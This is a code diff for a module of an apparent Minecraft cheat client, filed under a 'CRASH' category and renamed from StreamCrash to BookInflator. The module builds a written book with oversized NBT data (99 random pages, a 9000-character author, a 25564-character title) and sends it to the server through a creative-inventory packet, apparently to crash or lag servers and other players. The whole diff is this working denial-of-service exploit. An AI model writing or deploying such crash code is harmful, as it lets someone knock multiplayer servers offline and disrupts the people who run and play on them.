@@ -10,22 +10,15 @@ import net.minecraft.item.Items;
 import net.minecraft.nbt.NbtCompound;
 import net.minecraft.nbt.NbtList;
 import net.minecraft.nbt.NbtString;
-import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
 import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
 import net.shadow.client.ShadowMain;
 import net.shadow.client.feature.module.Module;
 import net.shadow.client.feature.module.ModuleType;
-import net.shadow.client.helper.util.Utils;
+import org.apache.commons.lang3.RandomStringUtils;
 
-import java.util.ArrayList;
-import java.util.List;
-import java.util.Optional;
-
-public class StreamCrash extends Module {
-
-    int slot = 0;
-
-    public StreamCrash() {
+public class BookInflator extends Module {
+    int slot = 5;
+    public BookInflator() {
         super("BookInflater", "Writes a book thats nbt value is 3x bigger than normal", ModuleType.CRASH);
     }
 
@@ -41,10 +34,10 @@ public class StreamCrash extends Module {
             NbtCompound tag = new NbtCompound();
             NbtList list = new NbtList();
             for (int j = 0; j < 99; j++) {
-                list.add(NbtString.of("{\"text\":"+ Utils.rndStr(200) + "\"}"));
+                list.add(NbtString.of("{\"text\":"+ RandomStringUtils.randomAlphabetic(200) + "\"}"));
             }
-            tag.put("author", NbtString.of(Utils.rndStr(9000)));
-            tag.put("title", NbtString.of(Utils.rndStr(25564)));
+            tag.put("author", NbtString.of(RandomStringUtils.randomAlphabetic(9000)));
+            tag.put("title", NbtString.of(RandomStringUtils.randomAlphabetic(25564)));
             tag.put("pages", list);
             crash.setNbt(tag);
             ShadowMain.client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(slot, crash));
